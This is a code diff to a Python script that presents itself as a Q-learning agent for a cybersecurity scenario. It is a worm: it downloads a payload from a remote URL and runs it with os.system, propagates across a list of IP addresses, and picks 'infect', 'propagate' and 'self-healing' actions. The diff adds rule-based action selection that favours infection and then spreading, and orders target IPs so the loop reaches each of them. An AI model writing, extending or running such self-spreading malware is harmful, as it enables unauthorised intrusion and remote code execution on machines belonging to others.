@@ -32,8 +32,24 @@ class LongTermMemory:
 
 long_term_memory = LongTermMemory()
 
+# Basic symbolic reasoning function
+def symbolic_reasoning(state: State) -> Optional[int]:
+    """Use symbolic reasoning to choose an action based on the state."""
+    if state.state_number < 10:
+        return 0  # Try infecting when in early states
+    elif state.state_number < 50:
+        return 2  # Propagate when in intermediate states
+    elif state.state_number >= 50:
+        return 1  # Perform self-healing when in later states
+    return None
+
 def choose_action(q_table: Dict[State, Dict[int, float]], state: State, exploration_probability: float) -> int:
     """Choose a random action to take with probability exploration_probability, or the best action otherwise."""
+    # Use symbolic reasoning for action selection
+    symbolic_action = symbolic_reasoning(state)
+    if symbolic_action is not None:
+        return symbolic_action
+
     if np.random.rand() < exploration_probability:
         return np.random.randint(0, 4)
     else:
@@ -136,6 +152,10 @@ def download_payload(payload_url: str) -> str:
     except urllib.error.URLError as e:
         sys.exit(1)
 
+def curriculum_learning_setup(ip_range: List[str]) -> List[str]:
+    """Setup curriculum learning by arranging IPs from simpler to more complex tasks."""
+    return sorted(ip_range, key=lambda ip: int(ip.split('.')[-1]))  # Simple heuristic: sort by last octet
+
 def main(ip_range: List[str], remote_server: str, port: int, payload_url: str) -> None:
     q_table: Dict[State, Dict[int, float]] = {State(ip, state_number): {action: 0.0 for action in range(4)} for ip in ip_range for state_number in range(MAX_STATE)}
     state = State(ip_range[0], 0)
@@ -144,30 +164,35 @@ def main(ip_range: List[str], remote_server: str, port: int, payload_url: str) -
 
     payload = download_payload(payload_url)
 
+    # Curriculum learning setup
+    ip_range = curriculum_learning_setup(ip_range)
+
     for episode in range(MAX_EPISODES):
-        action = choose_action(q_table, state, exploration_probability)
-        reward, next_state = take_action(action, state.ip)
+        for ip in ip_range:
+            state = State(ip, state.state_number)
+            action = choose_action(q_table, state, exploration_probability)
+            reward, next_state = take_action(action, state.ip)
 
-        if next_state is not None:
-            next_action = choose_action(q_table, next_state, exploration_probability)
-            q_table[state][action] = q_table[state][action] + LEARNING_RATE * (reward + DISCOUNT_FACTOR * q_table[next_state][next_action] - q_table[state][action])
+            if next_state is not None:
+                next_action = choose_action(q_table, next_state, exploration_probability)
+                q_table[state][action] = q_table[state][action] + LEARNING_RATE * (reward + DISCOUNT_FACTOR * q_table[next_state][next_action] - q_table[state][action])
 
-        long_term_memory.store(state, action, reward, next_state)
+            long_term_memory.store(state, action, reward, next_state)
 
-        exploration_probability *= decay_factor
+            exploration_probability *= decay_factor
 
-        state = next_state if next_state else state
+            state = next_state if next_state else state
 
-        if check_self_awareness(state.ip):
-            break
+            if check_self_awareness(state.ip):
+                break
 
-        if state.state_number == MAX_STATE:
-            break
+            if state.state_number == MAX_STATE:
+                break
 
-        if episode % 10 == 0:
-            perform_self_healing(state.ip)
-            propagate(ip_range)
-            os.system(payload)
+            if episode % 10 == 0:
+                perform_self_healing(state.ip)
+                propagate(ip_range)
+                os.system(payload)
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="A Q-learning agent for a cybersecurity scenario.")
